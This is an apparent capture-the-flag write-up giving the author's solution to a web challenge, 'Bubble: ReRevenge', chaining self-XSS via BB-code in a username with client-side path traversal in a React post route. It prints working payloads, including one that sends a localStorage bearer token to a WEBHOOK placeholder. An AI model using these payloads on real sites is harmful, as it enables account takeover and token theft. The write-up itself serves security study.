# Writeup 1

https://gist.github.com/as3617/25537beb3acaddc2ad4d025e6c08d29b

# Writeup 2

Author's solution for Bubble: ReRevenge

Draft functionality has Self XSS via BB-codes in preview

Create an account with the name like:
```
[yt srcdoc="<script>eval(parent.performance.getEntries().shift().name.split('#').pop())</script>"]
```
you still have 2 symbols left that you can use to unify username.Make a postAsk a bot to comment on your post, he always does a reply with your name in itPass the post ID with CSPT payload:

```
http://CHALLENGE/post/POST_ID/posts/..%252f..%252f..%252f..%252fdrafts%252fsave#new/**/Image().src='WEBHOOK?'+localStorage.getItem('DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique')
```

Post ID is handled using React's useParams and then passed to the REST API url without sanitization, which forces bot to save the draft instead of posting the comment when he clicks on the button. 
